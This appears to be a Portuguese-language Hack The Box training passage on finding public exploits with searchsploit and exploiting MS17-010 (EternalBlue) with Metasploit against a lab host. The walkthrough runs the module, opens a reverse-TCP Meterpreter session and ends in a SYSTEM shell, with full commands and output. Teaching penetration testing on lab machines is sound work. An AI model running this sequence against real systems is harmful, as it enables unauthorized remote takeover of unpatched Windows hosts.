Depois de identificar os serviços em execução nas portas identificadas em nossa verificação `Nmap`, a primeira etapa é verificar se algum dos aplicativos/serviços possui alguma exploração pública. Explorações públicas podem ser encontradas para aplicativos da Web e outros aplicativos executados em portas abertas, como `SSH` ou `ftp`.

### Encontrando Exploits Públicos

Muitas ferramentas podem nos ajudar a procurar explorações públicas para os vários aplicativos e serviços que podemos encontrar durante a fase de enumeração. Uma maneira é procurar no Google o nome do aplicativo `exploit` para ver se obtemos algum resultado:

![[Pasted image 20230614124056.png]]

Uma ferramenta bem conhecida para esse fim é `searchsploit`, que podemos usar para pesquisar vulnerabilidades/exploits públicos para qualquer aplicativo. Podemos instalá-lo com o seguinte comando:

```shell-session
casluxd@htb[/htb]$ sudo apt install exploitdb -y
```

Em seguida, podemos usar `searchsploit` para pesquisar um aplicativo específico por seu nome, conforme a seguir:

```shell-session
casluxd@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Também podemos utilizar bancos de dados de exploração online para procurar vulnerabilidades, como [Exploit DB](https://www.exploit-db.com/) , [Rapid7 DB](https://www.rapid7.com/db/) ou [Vulnerability Lab](https://www.vulnerability-lab.com/) .

## Metasploit Primer

O Metasploit Framework (MSF) é uma excelente ferramenta para pentesters. Ele contém muitos exploits integrados para muitas vulnerabilidades públicas e fornece uma maneira fácil de usar esses exploits contra alvos vulneráveis. MSF tem muitos outros recursos, como:

- Executando scripts de reconhecimento para enumerar hosts remotos e alvos comprometidos
- Scripts de verificação para testar a existência de uma vulnerabilidade sem realmente comprometer o alvo
- Meterpreter, que é uma ótima ferramenta para se conectar a shells e executar comandos nos alvos comprometidos
- Muitas ferramentas pós-exploração e pivotantes

Vamos dar um exemplo básico de busca de um exploit para um aplicativo que estamos atacando e como explorá-lo. Para executar `Metasploit`, podemos usar o comando `msfconsole`:

```shell-session
casluxd@htb[/htb]$ msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```

Depois de `Metasploit` executar, podemos procurar nosso aplicativo de destino com o comando `search exploit`. Por exemplo, podemos procurar a vulnerabilidade SMB que identificamos anteriormente:

```shell-session
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
```

Dica: A pesquisa pode aplicar filtros complexos, como pesquisa cve:2009 type:exploit.

Encontramos um exploit para este serviço. Podemos usá-lo copiando o nome completo dele e usando `USE` para usá-lo:

```shell-session
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Antes de podermos executar o exploit, precisamos configurar suas opções. Para visualizar as opções disponíveis para configurar, podemos usar o comando `show options`:

```shell-session
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

Qualquer opção `Required` definida como `yes` precisa ser definida para que o exploit funcione. Neste caso, temos apenas duas opções para definir: `RHOSTS`, que significa o IP do nosso destino (pode ser um IP, vários IPs ou um arquivo contendo uma lista de IPs). Podemos configurá-los com o comando `set`:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Depois de definir as duas opções, podemos iniciar a exploração. No entanto, antes de executar o script, podemos executar uma verificação para garantir que o servidor esteja vulnerável:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

Como podemos ver, o servidor está realmente vulnerável. Observe que nem todos os exploits no `Metasploit Framework` suportam a função `check`. Por fim, podemos usar o comando `run` ou  `exploit` para executar o exploit:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

Como podemos ver, conseguimos obter acesso de administrador à caixa e usamos o `shell`comando para nos colocar em um shell interativo. Estes são exemplos básicos de uso `Metasploit` para explorar uma vulnerabilidade em um servidor remoto. Existem muitas caixas aposentadas na plataforma Hack The Box que são ótimas para praticar o Metasploit. Alguns deles incluem, mas não se limitam a:
- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

